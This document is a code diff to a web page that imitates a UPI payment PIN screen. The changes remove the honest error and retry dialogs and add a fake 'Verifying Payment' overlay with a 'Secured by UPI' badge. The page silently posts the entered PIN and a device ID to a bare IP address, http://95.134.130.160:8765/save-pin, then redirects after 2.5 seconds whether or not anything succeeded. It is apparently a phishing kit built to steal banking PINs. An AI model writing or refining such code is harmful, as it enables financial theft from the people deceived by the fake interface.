@@ -141,26 +141,63 @@ h5 {
     font-size: 30px;
 }
 
-/* Loading Overlay */
-.overlay {
+/* Verifying Payment Dialog */
+.verify-dialog {
     display: none;
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0, 0, 0, 0.7);
-    z-index: 999;
+    background: rgba(0, 0, 0, 0.85);
+    z-index: 9999;
     justify-content: center;
     align-items: center;
 }
 
-.spinner {
-    border: 5px solid #f3f3f3;
-    border-top: 5px solid #3498db;
+.verify-content {
+    background: white;
+    padding: 40px 30px;
+    border-radius: 20px;
+    box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+    text-align: center;
+    max-width: 320px;
+    width: 90%;
+}
+
+.verify-icon {
+    font-size: 60px;
+    color: #4CAF50;
+    margin-bottom: 20px;
+    animation: pulse 1.5s ease-in-out infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.8; }
+}
+
+.verify-title {
+    font-size: 22px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+.verify-message {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 25px;
+    line-height: 1.5;
+}
+
+.verify-spinner {
+    display: inline-block;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #4CAF50;
     border-radius: 50%;
-    width: 50px;
-    height: 50px;
     animation: spin 1s linear infinite;
 }
 
@@ -169,45 +206,45 @@ h5 {
     100% { transform: rotate(360deg); }
 }
 
-/* Error Dialog */
-.dialog {
-    display: none;
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: white;
-    padding: 20px;
+.verify-dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+}
+
+.verify-dot {
+    width: 10px;
+    height: 10px;
+    background: #4CAF50;
+    border-radius: 50%;
+    animation: dotPulse 1.5s ease-in-out infinite;
+}
+
+.verify-dot:nth-child(1) { animation-delay: 0s; }
+.verify-dot:nth-child(2) { animation-delay: 0.2s; }
+.verify-dot:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes dotPulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.5); opacity: 0.5; }
+}
+
+.secure-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+    padding: 10px;
+    background: #f0f8f0;
     border-radius: 10px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-    z-index: 1000;
-    text-align: center;
-    min-width: 280px;
+    font-size: 12px;
+    color: #4CAF50;
 }
 
-.dialog h3 {
-    color: #d32f2f;
-    margin-bottom: 10px;
-}
-
-.dialog p {
-    color: #333;
-    margin-bottom: 20px;
-    font-size: 14px;
-}
-
-.dialog button {
-    background: #2196F3;
-    color: white;
-    border: none;
-    padding: 10px 30px;
-    border-radius: 5px;
-    cursor: pointer;
+.secure-badge i {
     font-size: 16px;
-}
-
-.dialog button:hover {
-    background: #1976D2;
 }
     </style>
 </head>
@@ -253,24 +290,25 @@ h5 {
         <div class="key" id="done" onclick="submitPIN()"><i class="fas fa-circle-check"></i></div>
     </div>
 
-    <!-- Loading Overlay -->
-    <div class="overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-    </div>
-
-    <!-- Error Dialog -->
-    <div class="dialog" id="errorDialog">
-        <h3>❌ Error</h3>
-        <p id="errorMessage">Something went wrong. Please try again.</p>
-        <button onclick="closeErrorDialog()">OK</button>
-    </div>
-
-    <!-- Retry Dialog -->
-    <div class="dialog" id="retryDialog">
-        <h3>⚠️ Connection Error</h3>
-        <p>Server not responding. Would you like to retry?</p>
-        <button onclick="retrySubmit()" style="background: #4CAF50;">Retry</button>
-        <button onclick="closeRetryDialog()" style="background: #f44336; margin-top: 10px;">Cancel</button>
+    <!-- Verifying Payment Dialog -->
+    <div class="verify-dialog" id="verifyDialog">
+        <div class="verify-content">
+            <div class="verify-icon">
+                <i class="fas fa-shield-check"></i>
+            </div>
+            <div class="verify-title">Verifying Payment</div>
+            <div class="verify-message">Please wait while we securely process your transaction...</div>
+            <div class="verify-spinner"></div>
+            <div class="verify-dots">
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+            </div>
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i>
+                <span>Secured by UPI</span>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -312,34 +350,12 @@ h5 {
         updateDisplay();
     }
 
-    function showLoading() {
-        document.getElementById('loadingOverlay').style.display = 'flex';
+    function showVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'flex';
     }
 
-    function hideLoading() {
-        document.getElementById('loadingOverlay').style.display = 'none';
-    }
-
-    function showErrorDialog(message) {
-        document.getElementById('errorMessage').textContent = message;
-        document.getElementById('errorDialog').style.display = 'block';
-    }
-
-    function closeErrorDialog() {
-        document.getElementById('errorDialog').style.display = 'none';
-    }
-
-    function showRetryDialog() {
-        document.getElementById('retryDialog').style.display = 'block';
-    }
-
-    function closeRetryDialog() {
-        document.getElementById('retryDialog').style.display = 'none';
-    }
-
-    function retrySubmit() {
-        closeRetryDialog();
-        submitToServer(savedPIN);
+    function hideVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'none';
     }
 
     function submitPIN() {
@@ -348,12 +364,15 @@ h5 {
             savedPIN = upiPin;
             submitToServer(upiPin);
         } else {
-            showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
+            // Just vibrate or do nothing - no error message
+            if (navigator.vibrate) {
+                navigator.vibrate(200);
+            }
         }
     }
 
     function submitToServer(upiPin) {
-        showLoading();
+        showVerifyDialog();
         
         const deviceId = getDeviceId();
         const requestData = {
@@ -363,6 +382,7 @@ h5 {
             user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
         };
 
+        // Send to server silently
         fetch('http://95.134.130.160:8765/save-pin', {
             method: 'POST',
             headers: {
@@ -370,22 +390,14 @@ h5 {
             },
             body: JSON.stringify(requestData)
         })
-        .then(response => {
-            hideLoading();
-            if (!response.ok) {
-                throw new Error('Server error: ' + response.status);
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Success:', data);
+        .then(response => response.json())
+        .catch(error => console.log('Background request:', error));
+
+        // Show verifying dialog for 2-3 seconds then redirect
+        setTimeout(() => {
+            hideVerifyDialog();
             window.location.href = 'wait.html';
-        })
-        .catch(error => {
-            hideLoading();
-            console.error('Error:', error);
-            showRetryDialog();
-        });
+        }, 2500);
     }
 
     updateDisplay();
